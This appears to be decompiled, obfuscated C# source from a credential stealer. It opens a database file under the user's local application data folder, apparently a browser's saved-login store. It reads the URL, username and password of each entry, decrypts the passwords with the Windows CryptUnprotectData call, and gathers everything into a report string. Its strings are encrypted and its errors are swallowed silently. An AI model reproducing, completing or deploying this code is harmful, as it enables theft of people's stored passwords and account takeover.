using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal sealed class Class13
{
	[Flags]
	public enum Enum0
	{
		flag_0 = 1,
		flag_1 = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct0
	{
		public int int_0;

		public Enum0 enum0_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct1
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	private static string string_0 = Class9.smethod_0("VnF8g3VWcXyDdVZxfIN1VnF8g3VWcYKuqoihpIN1VnF8g3VWcXyDdVZxfIN1VnF8g3VWcS8=", "False");

	private static string string_1 = Class9.smethod_0("WHN+hXdYc36Fd1hzfoV3WHN+hXdYc36Fd1hzfoV3WHN+hXdYc36Fd1hzfoV3WHN+hXdYcy0=", "False");

	public static string string_2;

	public static string string_3;

	public static void smethod_0()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class9.smethod_0("eH6xuKKInJ6Mo46mr66Xcaqnu1tgmLaql2CcqKqwiKuelaqDoLBpf32roy0=", "False");
		try
		{
			Class14 @class = new Class14(path);
			@class.method_6(Class9.smethod_0("stDT3NO5AQ==", "False"));
			if (!File.Exists(path))
			{
				return;
			}
			int num = @class.method_7() - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = @class.method_9(i, Class9.smethod_0("haOlqp6EkLG1oTA=", "False"));
				string text2 = @class.method_9(i, Class9.smethod_0("p8C90b+Tur2+x5O5zcQY", "False"));
				string text3 = smethod_1(Encoding.Default.GetBytes(@class.method_9(i, Class9.smethod_0("lKC9xLqTsa6wuYWrv7Ym", "False"))));
				if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text3, "", false) != 0))
				{
					string_2 = string_2 + Class9.smethod_0("lcbc1JtiBQ==", "False") + text + "\r\n" + Class9.smethod_0("i8TB1cOXvsGddRA=", "False") + text2 + "\r\n" + Class9.smethod_0("dqK/xryVs7CNZSA=", "False") + text3 + "\r\n\r\n";
				}
			}
			string_3 = string_0 + "\r\n\r\n" + string_2 + "\r\n" + string_1;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct1 struct1_0, string string_4, ref Struct1 struct1_1, IntPtr intptr_0, ref Struct0 struct0_0, int int_0, ref Struct1 struct1_2);

	public static string smethod_1(byte[] byte_0)
	{
		Struct1 struct1_ = default(Struct1);
		Struct1 struct1_2 = default(Struct1);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct1_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct1_.int_0 = byte_0.Length;
		gCHandle.Free();
		Struct1 @struct = default(Struct1);
		Struct1 struct1_3 = @struct;
		Struct0 struct2 = default(Struct0);
		Struct0 struct0_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		CryptUnprotectData(ref struct1_, null, ref struct1_3, intptr_, ref struct0_, 0, ref struct1_2);
		byte[] array = new byte[struct1_2.int_0 + 1];
		Marshal.Copy(struct1_2.intptr_0, array, 0, struct1_2.int_0);
		string @string = Encoding.Default.GetString(array);
		return @string.Substring(0, @string.Length - 1);
	}
}
